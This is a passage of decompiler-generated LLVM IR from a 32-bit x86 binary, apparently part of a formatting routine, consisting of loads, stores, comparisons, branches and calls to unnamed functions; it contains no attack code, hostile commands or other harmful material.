  %v1_804c672 = add i32 %v0_804c4ac.lcssa, 368
  %v2_804c672 = inttoptr i32 %v1_804c672 to i32*
  %v3_804c672 = load i32, i32* %v2_804c672, align 4
  %v5_804c672 = add i32 %v0_804c4ac.lcssa, -32
  %v6_804c672 = inttoptr i32 %v5_804c672 to i32*
  store i32 %v3_804c672, i32* %v6_804c672, align 4
  %v0_804c679 = call i32 @function_8050344()
  store i32 %v0_804c679, i32* %eax.global-to-local, align 4
  %v0_804c67e = load i32, i32* @esp, align 4
  %v1_804c67e = add i32 %v0_804c67e, 32
  %v2_804c681 = icmp slt i32 %v0_804c679, 0
  store i1 %v2_804c681, i1* %sf.global-to-local, align 1
  br i1 %v2_804c681, label %dec_label_pc_804c92f, label %dec_label_pc_804c689

dec_label_pc_804c689:                             ; preds = %dec_label_pc_804c660
  %v1_804c689 = inttoptr i32 %v1_804c67e to i32*
  %v2_804c689 = load i32, i32* %v1_804c689, align 4
  %v4_804c689 = add i32 %v2_804c689, %v0_804c679
  %v15_804c689 = icmp slt i32 %v4_804c689, 0
  store i1 %v15_804c689, i1* %sf.global-to-local, align 1
  store i32 %v4_804c689, i32* %v1_804c689, align 4
  %v0_804c91c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c91c

dec_label_pc_804c691:                             ; preds = %dec_label_pc_804c647
  %v1_804c691 = add i32 %v3_804c4ac, -17
  %v5_804c691 = icmp ult i32 %v3_804c4ac, 17
  %v9_804c691 = icmp eq i32 %v1_804c691, 0
  %v10_804c691 = icmp slt i32 %v1_804c691, 0
  store i1 %v10_804c691, i1* %sf.global-to-local, align 1
  %v2_804c694 = or i1 %v5_804c691, %v9_804c691
  br i1 %v2_804c694, label %dec_label_pc_804c69a, label %dec_label_pc_804c72e

dec_label_pc_804c69a:                             ; preds = %dec_label_pc_804c691
  %v1_804c69a = add i32 %v0_804c4ac.lcssa, 332
  %v2_804c69a = inttoptr i32 %v1_804c69a to i32*
  store i32 0, i32* %v2_804c69a, align 4
  %v0_804c6a5 = load i32, i32* @esp, align 4
  %v1_804c6a5 = add i32 %v0_804c6a5, 344
  %v2_804c6a5 = inttoptr i32 %v1_804c6a5 to i32*
  %v3_804c6a5 = load i32, i32* %v2_804c6a5, align 4
  store i32 %v3_804c6a5, i32* %edx.global-to-local, align 4
  %v1_804c6ac = icmp eq i1 %v9_804c691, false
  br i1 %v1_804c6ac, label %dec_label_pc_804c6fe, label %dec_label_pc_804c6ae

dec_label_pc_804c6ae:                             ; preds = %dec_label_pc_804c69a
  %v1_804c6ae = inttoptr i32 %v3_804c6a5 to i32*
  %v2_804c6ae = load i32, i32* %v1_804c6ae, align 4
  store i32 %v2_804c6ae, i32* %eax.global-to-local, align 4
  %v1_804c6b0 = icmp eq i32 %v2_804c6ae, 0
  %v2_804c6b0 = icmp slt i32 %v2_804c6ae, 0
  store i1 %v2_804c6b0, i1* %sf.global-to-local, align 1
  %v2_804c6b2 = add i32 %v0_804c6a5, 340
  %v3_804c6b2 = inttoptr i32 %v2_804c6b2 to i32*
  store i32 %v2_804c6ae, i32* %v3_804c6b2, align 4
  br i1 %v1_804c6b0, label %dec_label_pc_804c7b9, label %dec_label_pc_804c6bf

dec_label_pc_804c6bf:                             ; preds = %dec_label_pc_804c6ae
  %v0_804c6bf = load i32, i32* @esp, align 4
  %v1_804c6bf = add i32 %v0_804c6bf, 20
  %v2_804c6bf = inttoptr i32 %v1_804c6bf to i32*
  %v3_804c6bf = load i32, i32* %v2_804c6bf, align 4
  %v1_804c6c6 = add i32 %v0_804c6bf, 340
  store i32 %v1_804c6c6, i32* %ecx.global-to-local, align 4
  %v2_804c6cd = icmp slt i32 %v3_804c6bf, 0
  store i1 %v2_804c6cd, i1* %sf.global-to-local, align 1
  %v1_804c6cf = icmp eq i1 %v2_804c6cd, false
  %v4_804c6cf = select i1 %v1_804c6cf, i32 %v3_804c6bf, i32 -1
  store i32 %v4_804c6cf, i32* %edx.global-to-local, align 4
  %v1_804c6d2 = add i32 %v0_804c6bf, 332
  store i32 %v1_804c6d2, i32* %eax.global-to-local, align 4
  %v2_804c6d9 = add i32 %v0_804c6bf, -4
  %v3_804c6d9 = inttoptr i32 %v2_804c6d9 to i32*
  store i32 %v1_804c6d2, i32* %v3_804c6d9, align 4
  %v0_804c6da = load i32, i32* %edx.global-to-local, align 4
  %v2_804c6da = add i32 %v0_804c6bf, -8
  %v3_804c6da = inttoptr i32 %v2_804c6da to i32*
  store i32 %v0_804c6da, i32* %v3_804c6da, align 4
  %v0_804c6db = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c6db = add i32 %v0_804c6bf, -12
  %v3_804c6db = inttoptr i32 %v2_804c6db to i32*
  store i32 %v0_804c6db, i32* %v3_804c6db, align 4
  %v0_804c6dc = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c6dc = add i32 %v0_804c6bf, -16
  %v3_804c6dc = inttoptr i32 %v2_804c6dc to i32*
  store i32 %v0_804c6dc, i32* %v3_804c6dc, align 4
  %v0_804c6dd = call i32 @function_804feec()
  store i32 %v0_804c6dd, i32* %eax.global-to-local, align 4
  %v0_804c6e2 = load i32, i32* @esp, align 4
  %v1_804c6e2 = add i32 %v0_804c6e2, 16
  %v1_804c6e5 = add i32 %v0_804c6dd, 1
  %v10_804c6e5 = icmp eq i32 %v1_804c6e5, 0
  %v11_804c6e5 = icmp slt i32 %v1_804c6e5, 0
  store i1 %v11_804c6e5, i1* %sf.global-to-local, align 1
  store i32 %v0_804c6dd, i32* @esi, align 4
  br i1 %v10_804c6e5, label %dec_label_pc_804c92f, label %dec_label_pc_804c6f0

dec_label_pc_804c6f0:                             ; preds = %dec_label_pc_804c6bf
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804c7ca

dec_label_pc_804c6fe:                             ; preds = %dec_label_pc_804c69a
  %v0_804c6fe = load i32, i32* @ebx, align 4
  %v2_804c6fe = add i32 %v0_804c6a5, -4
  %v3_804c6fe = inttoptr i32 %v2_804c6fe to i32*
  store i32 %v0_804c6fe, i32* %v3_804c6fe, align 4
  %v1_804c6ff = add i32 %v0_804c6a5, 332
  store i32 %v1_804c6ff, i32* %eax.global-to-local, align 4
  %v2_804c706 = add i32 %v0_804c6a5, -8
  %v3_804c706 = inttoptr i32 %v2_804c706 to i32*
  store i32 %v1_804c6ff, i32* %v3_804c706, align 4
  %v0_804c707 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c707 = inttoptr i32 %v0_804c707 to i32*
  %v2_804c707 = load i32, i32* %v1_804c707, align 4
  %v4_804c707 = add i32 %v0_804c6a5, -12
  %v5_804c707 = inttoptr i32 %v4_804c707 to i32*
  store i32 %v2_804c707, i32* %v5_804c707, align 4
  %v1_804c709 = add i32 %v0_804c6a5, 204
  store i32 %v1_804c709, i32* @edi, align 4
  %v2_804c710 = add i32 %v0_804c6a5, -16
  %v3_804c710 = inttoptr i32 %v2_804c710 to i32*
  store i32 %v1_804c709, i32* %v3_804c710, align 4
  %v0_804c711 = call i32 @function_804fea4()
  store i32 %v0_804c711, i32* %eax.global-to-local, align 4
  %v0_804c716 = load i32, i32* @esp, align 4
  %v1_804c716 = add i32 %v0_804c716, 16
  %v1_804c719 = add i32 %v0_804c711, 1
  %v10_804c719 = icmp eq i32 %v1_804c719, 0
  %v11_804c719 = icmp slt i32 %v1_804c719, 0
  store i1 %v11_804c719, i1* %sf.global-to-local, align 1
  store i32 %v0_804c711, i32* @esi, align 4
  br i1 %v10_804c719, label %dec_label_pc_804c92f, label %dec_label_pc_804c724

dec_label_pc_804c724:                             ; preds = %dec_label_pc_804c6fe
  %v2_804c724 = add i32 %v0_804c711, 220
  %v3_804c724 = add i32 %v2_804c724, %v0_804c716
  %v4_804c724 = inttoptr i32 %v3_804c724 to i8*
  store i8 0, i8* %v4_804c724, align 1
  br label %dec_label_pc_804c75c

dec_label_pc_804c72e:                             ; preds = %dec_label_pc_804c691
  %v1_804c72e = add i32 %v3_804c4ac, -19
  %v5_804c72e = icmp ult i32 %v3_804c4ac, 19
  %v9_804c72e = icmp eq i32 %v1_804c72e, 0
  %v10_804c72e = icmp slt i32 %v1_804c72e, 0
  store i1 %v10_804c72e, i1* %sf.global-to-local, align 1
  %v2_804c731 = or i1 %v5_804c72e, %v9_804c72e
  br i1 %v2_804c731, label %dec_label_pc_804c733, label %dec_label_pc_804c78b

dec_label_pc_804c733:                             ; preds = %dec_label_pc_804c72e
  %v1_804c733 = add i32 %v0_804c4ac.lcssa, 344
  %v2_804c733 = inttoptr i32 %v1_804c733 to i32*
  %v3_804c733 = load i32, i32* %v2_804c733, align 4
  store i32 %v3_804c733, i32* %edx.global-to-local, align 4
  %v1_804c73a = icmp eq i1 %v9_804c72e, false
  %v1_804c765 = inttoptr i32 %v3_804c733 to i32*
  %v2_804c765 = load i32, i32* %v1_804c765, align 4
  br i1 %v1_804c73a, label %dec_label_pc_804c765, label %dec_label_pc_804c73c

dec_label_pc_804c73c:                             ; preds = %dec_label_pc_804c733
  store i32 %v2_804c765, i32* @edi, align 4
  %v1_804c73e = icmp eq i32 %v2_804c765, 0
  %v2_804c73e = icmp slt i32 %v2_804c765, 0
  store i1 %v2_804c73e, i1* %sf.global-to-local, align 1
  br i1 %v1_804c73e, label %dec_label_pc_804c7b9, label %dec_label_pc_804c742

dec_label_pc_804c742:                             ; preds = %dec_label_pc_804c73c, %dec_label_pc_804c794
  %v1_804c749 = phi i32 [ %v0_804c4ac.lcssa, %dec_label_pc_804c73c ], [ %v1_804c7ae, %dec_label_pc_804c794 ]
  %v1_804c742 = add i32 %v1_804c749, 20
  %v2_804c742 = inttoptr i32 %v1_804c742 to i32*
  %v3_804c742 = load i32, i32* %v2_804c742, align 4
  store i32 %v3_804c742, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804c749 = add i32 %v1_804c749, -4
  %v3_804c749 = inttoptr i32 %v2_804c749 to i32*
  store i32 %v3_804c4ac, i32* %v3_804c749, align 4
  %v2_804c74a = add i32 %v1_804c749, -8
  %v3_804c74a = inttoptr i32 %v2_804c74a to i32*
  store i32 %v3_804c4ac, i32* %v3_804c74a, align 4
  %v2_804c74b = icmp slt i32 %v3_804c742, 0
  store i1 %v2_804c74b, i1* %sf.global-to-local, align 1
  %v1_804c74d = icmp eq i1 %v2_804c74b, false
  %v2_804c74d = load i32, i32* %eax.global-to-local, align 4
  %v4_804c74d = select i1 %v1_804c74d, i32 %v3_804c742, i32 %v2_804c74d
  store i32 %v4_804c74d, i32* %eax.global-to-local, align 4
  %v2_804c750 = add i32 %v1_804c749, -12
  %v3_804c750 = inttoptr i32 %v2_804c750 to i32*
  store i32 %v4_804c74d, i32* %v3_804c750, align 4
  %v0_804c751 = load i32, i32* @edi, align 4
  %v2_804c751 = add i32 %v1_804c749, -16
  %v3_804c751 = inttoptr i32 %v2_804c751 to i32*
  store i32 %v0_804c751, i32* %v3_804c751, align 4
  %v0_804c752 = call i32 @function_804d550()
  store i32 %v0_804c752, i32* %eax.global-to-local, align 4
  %v0_804c757 = load i32, i32* @esp, align 4
  %v1_804c757 = add i32 %v0_804c757, 16
  %v7_804c757 = icmp slt i32 %v1_804c757, 0
  store i1 %v7_804c757, i1* %sf.global-to-local, align 1
  store i32 %v0_804c752, i32* @esi, align 4
  br label %dec_label_pc_804c75c

dec_label_pc_804c75c:                             ; preds = %dec_label_pc_804c724, %dec_label_pc_804c742
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804c7ca

dec_label_pc_804c765:                             ; preds = %dec_label_pc_804c733
  store i32 %v2_804c765, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804c773 = add i32 %v0_804c4ac.lcssa, 204
  store i32 %v1_804c773, i32* @edi, align 4
  %v1_804c77a = add i32 %v0_804c4ac.lcssa, 205
  %v2_804c77a = inttoptr i32 %v1_804c77a to i8*
  store i8 0, i8* %v2_804c77a, align 1
  %v0_804c782 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c782 = trunc i32 %v0_804c782 to i8
  %v2_804c782 = load i32, i32* @esp, align 4
  %v3_804c782 = add i32 %v2_804c782, 204
  %v4_804c782 = inttoptr i32 %v3_804c782 to i8*
  store i8 %v1_804c782, i8* %v4_804c782, align 1
  br label %dec_label_pc_804c7ca

dec_label_pc_804c78b:                             ; preds = %dec_label_pc_804c72e
  %v1_804c78b = add i32 %v3_804c4ac, -20
  %v9_804c78b = icmp eq i32 %v1_804c78b, 0
  %v10_804c78b = icmp slt i32 %v1_804c78b, 0
  store i1 %v10_804c78b, i1* %sf.global-to-local, align 1
  %v1_804c78e = icmp eq i1 %v9_804c78b, false
  br i1 %v1_804c78e, label %dec_label_pc_804c92f, label %dec_label_pc_804c794

dec_label_pc_804c794:                             ; preds = %dec_label_pc_804c78b
  %v0_804c794 = load i32, i32* %stack_var_-364, align 4
  %v1_804c794 = call i32 @function_804baa4(i32 %v0_804c794)
  store i32 %v1_804c794, i32* %eax.global-to-local, align 4
  %v0_804c799 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c799 = load i32, i32* @esp, align 4
  %v2_804c799 = add i32 %v1_804c799, -4
  %v3_804c799 = inttoptr i32 %v2_804c799 to i32*
  store i32 %v0_804c799, i32* %v3_804c799, align 4
  %v1_804c79a = add i32 %v1_804c799, -8
  %v2_804c79a = inttoptr i32 %v1_804c79a to i32*
  store i32 128, i32* %v2_804c79a, align 4
  %v1_804c79f = add i32 %v1_804c799, 204
  store i32 %v1_804c79f, i32* %edx.global-to-local, align 4
  %v2_804c7a6 = add i32 %v1_804c799, -12
  %v3_804c7a6 = inttoptr i32 %v2_804c7a6 to i32*
  store i32 %v1_804c79f, i32* %v3_804c7a6, align 4
  %v1_804c7a7 = inttoptr i32 %v1_804c794 to i32*
  %v2_804c7a7 = load i32, i32* %v1_804c7a7, align 4
  %v4_804c7a7 = add i32 %v1_804c799, -16
  %v5_804c7a7 = inttoptr i32 %v4_804c7a7 to i32*
  store i32 %v2_804c7a7, i32* %v5_804c7a7, align 4
  %v0_804c7a9 = call i32 @function_804d56c()
  store i32 %v0_804c7a9, i32* %eax.global-to-local, align 4
  %v0_804c7ae = load i32, i32* @esp, align 4
  %v1_804c7ae = add i32 %v0_804c7ae, 16
  %v7_804c7ae = icmp slt i32 %v1_804c7ae, 0
  store i1 %v7_804c7ae, i1* %sf.global-to-local, align 1
  store i32 %v0_804c7a9, i32* @edi, align 4
  br label %dec_label_pc_804c742

dec_label_pc_804c7b5:                             ; preds = %dec_label_pc_804c636, %dec_label_pc_804c62f, %dec_label_pc_804c61c
  %v0_804c7d233 = phi i32 [ %v1_804c5c5, %dec_label_pc_804c636 ], [ 0, %dec_label_pc_804c62f ], [ 5, %dec_label_pc_804c61c ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c7cf

dec_label_pc_804c7b9:                             ; preds = %dec_label_pc_804c73c, %dec_label_pc_804c6ae
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8053a8a.121 to i32), i32* @edi, align 4
  br label %dec_label_pc_804c7ca

dec_label_pc_804c7ca:                             ; preds = %dec_label_pc_804c765, %dec_label_pc_804c75c, %dec_label_pc_804c6f0, %dec_label_pc_804c7b9
  %v0_804c7ca = load i32, i32* @esp, align 4
  %v1_804c7ca = add i32 %v0_804c7ca, 7
  %v2_804c7ca = inttoptr i32 %v1_804c7ca to i8*
  store i8 32, i8* %v2_804c7ca, align 1
  %v0_804c7d2.pre = load i32, i32* @esi, align 4
  %v1_804c7d2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c7cf

dec_label_pc_804c7cf:                             ; preds = %dec_label_pc_804c7b5, %dec_label_pc_804c63e, %dec_label_pc_804c7ca
  %v1_804c7d2 = phi i32 [ 0, %dec_label_pc_804c7b5 ], [ %v2_804c636, %dec_label_pc_804c63e ], [ %v1_804c7d2.pre, %dec_label_pc_804c7ca ]
  %v0_804c7d2 = phi i32 [ %v0_804c7d233, %dec_label_pc_804c7b5 ], [ %v1_804c5c5, %dec_label_pc_804c63e ], [ %v0_804c7d2.pre, %dec_label_pc_804c7ca ]
  %v0_804c7cf = load i32, i32* @ebp, align 4
  %v1_804c7cf = add i32 %v0_804c7cf, -11
  %v9_804c7cf = icmp eq i32 %v1_804c7cf, 0
  %v10_804c7cf = icmp slt i32 %v1_804c7cf, 0
  store i1 %v10_804c7cf, i1* %sf.global-to-local, align 1
  %v2_804c7d2 = add i32 %v0_804c7d2, %v1_804c7d2
  store i32 %v2_804c7d2, i32* @edx, align 4
  br i1 %v9_804c7cf, label %dec_label_pc_804c7e3, label %dec_label_pc_804c7d7

dec_label_pc_804c7d7:                             ; preds = %dec_label_pc_804c7cf
  %v1_804c7d9 = add i32 %v0_804c7cf, -5
  %v6_804c7d9 = sub i32 4, %v0_804c7cf
  %v7_804c7d9 = and i32 %v6_804c7d9, %v0_804c7cf
  %v8_804c7d9 = icmp slt i32 %v7_804c7d9, 0
  %v9_804c7d9 = icmp eq i32 %v1_804c7d9, 0
  %v10_804c7d9 = icmp slt i32 %v1_804c7d9, 0
  store i1 %v10_804c7d9, i1* %sf.global-to-local, align 1
  %v3_804c7dc = icmp eq i1 %v10_804c7d9, %v8_804c7d9
  %v4_804c7dc = icmp eq i1 %v9_804c7d9, false
  %v5_804c7dc = and i1 %v4_804c7dc, %v3_804c7dc
  %v6_804c7dc = zext i1 %v5_804c7dc to i32
  store i32 %v6_804c7dc, i32* %eax.global-to-local, align 4
  %v2_804c7df = add i32 %v2_804c7d2, 1
  %v3_804c7df = add i32 %v2_804c7df, %v6_804c7dc
  store i32 %v3_804c7df, i32* @edx, align 4
  br label %dec_label_pc_804c7e3

dec_label_pc_804c7e3:                             ; preds = %dec_label_pc_804c7cf, %dec_label_pc_804c7d7
  %v0_804c7e3 = load i32, i32* @esp, align 4
  %v1_804c7e3 = add i32 %v0_804c7e3, 24
  %v2_804c7e3 = inttoptr i32 %v1_804c7e3 to i32*
  %v3_804c7e3 = load i32, i32* %v2_804c7e3, align 4
  store i32 %v3_804c7e3, i32* %eax.global-to-local, align 4
  %v1_804c7e7 = add i32 %v0_804c7e3, 8
  %v2_804c7e7 = inttoptr i32 %v1_804c7e7 to i32*
  store i32 0, i32* %v2_804c7e7, align 4
  %v0_804c7ef = load i32, i32* %eax.global-to-local, align 4
  %v1_804c7ef = load i32, i32* @edx, align 4
  %v2_804c7ef = sub i32 %v0_804c7ef, %v1_804c7ef
  %v7_804c7ef = icmp ult i32 %v0_804c7ef, %v1_804c7ef
  %v12_804c7ef = icmp eq i32 %v2_804c7ef, 0
  %v13_804c7ef = icmp slt i32 %v2_804c7ef, 0
  store i1 %v13_804c7ef, i1* %sf.global-to-local, align 1
  %v2_804c7f1 = or i1 %v7_804c7ef, %v12_804c7ef
  br i1 %v2_804c7f1, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7f3

dec_label_pc_804c7f3:                             ; preds = %dec_label_pc_804c7e3
  store i1 %v13_804c7ef, i1* %sf.global-to-local, align 1
  store i32 %v2_804c7ef, i32* %eax.global-to-local, align 4
  %v1_804c7f5 = load i32, i32* @esp, align 4
  %v2_804c7f5 = add i32 %v1_804c7f5, 8
  %v3_804c7f5 = inttoptr i32 %v2_804c7f5 to i32*
  store i32 %v2_804c7ef, i32* %v3_804c7f5, align 4
  %v0_804c7fd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c7f9

dec_label_pc_804c7f9:                             ; preds = %dec_label_pc_804c7e3, %dec_label_pc_804c7f3
  %v0_804c7fd = phi i32 [ %v1_804c7ef, %dec_label_pc_804c7e3 ], [ %v0_804c7fd.pre, %dec_label_pc_804c7f3 ]
  %v0_804c7f9 = load i32, i32* @esp, align 4
  %v1_804c7f9 = add i32 %v0_804c7f9, 8
  %v2_804c7f9 = inttoptr i32 %v1_804c7f9 to i32*
  %v3_804c7f9 = load i32, i32* %v2_804c7f9, align 4
  store i32 %v3_804c7f9, i32* %ecx.global-to-local, align 4
  %v2_804c7fd = add i32 %v3_804c7f9, %v0_804c7fd
  store i32 %v2_804c7fd, i32* %eax.global-to-local, align 4
  %v1_804c800 = inttoptr i32 %v0_804c7f9 to i32*
  %v2_804c800 = load i32, i32* %v1_804c800, align 4
  %v4_804c800 = add i32 %v2_804c800, %v2_804c7fd
  %v15_804c800 = icmp slt i32 %v4_804c800, 0
  store i1 %v15_804c800, i1* %sf.global-to-local, align 1
  store i32 %v4_804c800, i32* %v1_804c800, align 4
  %v0_804c803 = load i32, i32* @esp, align 4
  %v1_804c803 = add i32 %v0_804c803, 7
  %v2_804c803 = inttoptr i32 %v1_804c803 to i8*
  %v3_804c803 = load i8, i8* %v2_804c803, align 1
  %v4_804c803 = add i8 %v3_804c803, -48
  %v9_804c803 = icmp eq i8 %v4_804c803, 0
  %v10_804c803 = icmp slt i8 %v4_804c803, 0
  store i1 %v10_804c803, i1* %sf.global-to-local, align 1
  %v1_804c808 = icmp eq i1 %v9_804c803, false
  br i1 %v1_804c808, label %dec_label_pc_804c814, label %dec_label_pc_804c80a

dec_label_pc_804c80a:                             ; preds = %dec_label_pc_804c7f9
  %v0_804c80a = load i32, i32* @ebx, align 4
  %v1_804c80a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c80a = add i32 %v1_804c80a, %v0_804c80a
  %v13_804c80a = icmp slt i32 %v2_804c80a, 0
  store i1 %v13_804c80a, i1* %sf.global-to-local, align 1
  store i32 %v2_804c80a, i32* @ebx, align 4
  %v1_804c80c = add i32 %v0_804c803, 8
  %v2_804c80c = inttoptr i32 %v1_804c80c to i32*
  store i32 0, i32* %v2_804c80c, align 4
  %v0_804c814.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c814

dec_label_pc_804c814:                             ; preds = %dec_label_pc_804c7f9, %dec_label_pc_804c80a
  %v0_804c81b = phi i32 [ %v0_804c803, %dec_label_pc_804c7f9 ], [ %v0_804c814.pre, %dec_label_pc_804c80a ]
  %v1_804c814 = add i32 %v0_804c81b, 32
  %v2_804c814 = inttoptr i32 %v1_804c814 to i8*
  %v3_804c814 = load i8, i8* %v2_804c814, align 1
  %v4_804c814 = and i8 %v3_804c814, 8
  %v5_804c814 = icmp eq i8 %v4_804c814, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c819 = icmp eq i1 %v5_804c814, false
  br i1 %v1_804c819, label %dec_label_pc_804c842, label %dec_label_pc_804c81b

dec_label_pc_804c81b:                             ; preds = %dec_label_pc_804c814
  %v1_804c81b = add i32 %v0_804c81b, 8
  %v2_804c81b = inttoptr i32 %v1_804c81b to i32*
  %v3_804c81b = load i32, i32* %v2_804c81b, align 4
  store i32 %v3_804c81b, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c824 = add i32 %v0_804c81b, 368
  %v2_804c824 = inttoptr i32 %v1_804c824 to i32*
  %v3_804c824 = load i32, i32* %v2_804c824, align 4
  store i32 %v3_804c824, i32* @eax, align 4
  %v0_804c82b = call i32 @function_804c2ec()
  store i32 %v0_804c82b, i32* %eax.global-to-local, align 4
  %v1_804c830 = load i32, i32* @esp, align 4
  %v2_804c830 = add i32 %v1_804c830, 8
  %v3_804c830 = inttoptr i32 %v2_804c830 to i32*
  %v4_804c830 = load i32, i32* %v3_804c830, align 4
  %v5_804c830 = sub i32 %v0_804c82b, %v4_804c830
  %v15_804c830 = icmp eq i32 %v5_804c830, 0
  %v16_804c830 = icmp slt i32 %v5_804c830, 0
  store i1 %v16_804c830, i1* %sf.global-to-local, align 1
  %v1_804c834 = icmp eq i1 %v15_804c830, false
  br i1 %v1_804c834, label %dec_label_pc_804c92f, label %dec_label_pc_804c83a

dec_label_pc_804c83a:                             ; preds = %dec_label_pc_804c81b
  store i32 0, i32* %v3_804c830, align 4
  %v1_804c842.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c842

dec_label_pc_804c842:                             ; preds = %dec_label_pc_804c814, %dec_label_pc_804c83a
  %v1_804c842 = phi i32 [ %v0_804c81b, %dec_label_pc_804c814 ], [ %v1_804c842.pre, %dec_label_pc_804c83a ]
  %v0_804c842 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c842 = add i32 %v1_804c842, -4
  %v3_804c842 = inttoptr i32 %v2_804c842 to i32*
  store i32 %v0_804c842, i32* %v3_804c842, align 4
  %v0_804c843 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c843 = add i32 %v1_804c842, -8
  %v3_804c843 = inttoptr i32 %v2_804c843 to i32*
  store i32 %v0_804c843, i32* %v3_804c843, align 4
  %v1_804c844 = add i32 %v1_804c842, 368
  %v2_804c844 = inttoptr i32 %v1_804c844 to i32*
  %v3_804c844 = load i32, i32* %v2_804c844, align 4
  %v5_804c844 = add i32 %v1_804c842, -12
  %v6_804c844 = inttoptr i32 %v5_804c844 to i32*
  store i32 %v3_804c844, i32* %v6_804c844, align 4
  %v0_804c84b = load i32, i32* @ebp, align 4
  %v1_804c84b = add i32 %v0_804c84b, ptrtoint (i32* @global_var_8053a91.122 to i32)
  store i32 %v1_804c84b, i32* %eax.global-to-local, align 4
  %v2_804c851 = add i32 %v1_804c842, -16
  %v3_804c851 = inttoptr i32 %v2_804c851 to i32*
  store i32 %v1_804c84b, i32* %v3_804c851, align 4
  %v0_804c852 = call i32 @function_804d40c()
  store i32 %v0_804c852, i32* %eax.global-to-local, align 4
  %v0_804c857 = load i32, i32* @esp, align 4
  %v1_804c857 = add i32 %v0_804c857, 384
  %v2_804c857 = inttoptr i32 %v1_804c857 to i32*
  %v3_804c857 = load i32, i32* %v2_804c857, align 4
  store i32 %v3_804c857, i32* @eax, align 4
  %v0_804c85e = load i32, i32* @ebx, align 4
  store i32 %v0_804c85e, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804c865 = call i32 @function_804c2ec()
  store i32 %v0_804c865, i32* %eax.global-to-local, align 4
  %v0_804c86a = load i32, i32* @esp, align 4
  %v1_804c86a = add i32 %v0_804c86a, 16
  %v1_804c86d = load i32, i32* @ebx, align 4
  %v2_804c86d = sub i32 %v0_804c865, %v1_804c86d
  %v12_804c86d = icmp eq i32 %v2_804c86d, 0
  %v13_804c86d = icmp slt i32 %v2_804c86d, 0
  store i1 %v13_804c86d, i1* %sf.global-to-local, align 1
  %v1_804c86f = icmp eq i1 %v12_804c86d, false
  br i1 %v1_804c86f, label %dec_label_pc_804c92f, label %dec_label_pc_804c875

dec_label_pc_804c875:                             ; preds = %dec_label_pc_804c842
  %v1_804c875 = add i32 %v0_804c86a, 356
  %v2_804c875 = inttoptr i32 %v1_804c875 to i32*
  %v3_804c875 = load i32, i32* %v2_804c875, align 4
  %v4_804c875 = icmp eq i32 %v3_804c875, 0
  %v5_804c875 = icmp slt i32 %v3_804c875, 0
  store i1 %v5_804c875, i1* %sf.global-to-local, align 1
  %v1_804c87d = icmp eq i1 %v4_804c875, false
  br i1 %v1_804c87d, label %dec_label_pc_804c8a1, label %dec_label_pc_804c87f

dec_label_pc_804c87f:                             ; preds = %dec_label_pc_804c875
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804c881 = load i32, i32* @esi, align 4
  %v1_804c881 = icmp eq i32 %v0_804c881, 0
  %v2_804c881 = icmp slt i32 %v0_804c881, 0
  store i1 %v2_804c881, i1* %sf.global-to-local, align 1
  br i1 %v1_804c881, label %dec_label_pc_804c897, label %dec_label_pc_804c885

dec_label_pc_804c885:                             ; preds = %dec_label_pc_804c87f
  %v2_804c885 = add i32 %v0_804c86a, 12
  %v3_804c885 = inttoptr i32 %v2_804c885 to i32*
  store i32 0, i32* %v3_804c885, align 4
  %v1_804c886 = add i32 %v0_804c86a, 384
  %v2_804c886 = inttoptr i32 %v1_804c886 to i32*
  %v3_804c886 = load i32, i32* %v2_804c886, align 4
  %v5_804c886 = add i32 %v0_804c86a, 8
  %v6_804c886 = inttoptr i32 %v5_804c886 to i32*
  store i32 %v3_804c886, i32* %v6_804c886, align 4
  %v0_804c88d = load i32, i32* @esi, align 4
  %v2_804c88d = add i32 %v0_804c86a, 4
  %v3_804c88d = inttoptr i32 %v2_804c88d to i32*
  store i32 %v0_804c88d, i32* %v3_804c88d, align 4
  %v0_804c88e = load i32, i32* @edi, align 4
  %v3_804c88e = inttoptr i32 %v0_804c86a to i32*
  store i32 %v0_804c88e, i32* %v3_804c88e, align 4
  %v0_804c88f = load i32, i32* %stack_var_-364, align 4
  %v4_804c88f = call i32 @function_8050048(i32 %v0_804c88f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c88f, i32* %eax.global-to-local, align 4
  %v0_804c894 = load i32, i32* @esp, align 4
  %v1_804c894 = add i32 %v0_804c894, 16
  %v7_804c894 = icmp slt i32 %v1_804c894, 0
  store i1 %v7_804c894, i1* %sf.global-to-local, align 1
  %v1_804c897.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c897

dec_label_pc_804c897:                             ; preds = %dec_label_pc_804c87f, %dec_label_pc_804c885
